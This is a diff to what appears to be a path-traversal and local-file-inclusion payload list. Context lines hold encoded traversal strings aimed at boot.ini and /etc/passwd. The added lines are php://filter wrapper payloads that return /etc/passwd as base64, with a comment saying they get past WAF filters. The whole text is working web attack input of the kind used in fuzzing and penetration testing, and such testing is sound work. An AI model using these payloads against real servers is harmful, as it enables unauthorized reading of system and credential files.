@@ -48,3 +48,8 @@ Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4v
 ..%ef%b9%a8..%ef%b9%a8..%ef%b9%a8..%ef%b9%a8..%ef%b9%a8..%ef%b9%a8boot.ini
 ..%ef%bc%bc..%ef%bc%bc..%ef%bc%bc..%ef%bc%bc..%ef%bc%bc..%ef%bc%bc..%ef%bc%bcboot.ini
 ///////../../../etc/passwd
+# PHP wrapper payloads - php://filter returns file content as base64,
+# bypassing WAF filters and preventing PHP files from being executed.
+php://filter/convert.base64-encode/resource=/etc/passwd
+php://filter/read=convert.base64-encode/resource=/etc/passwd
+php://filter/convert.base64-encode/resource=../../../etc/passwd
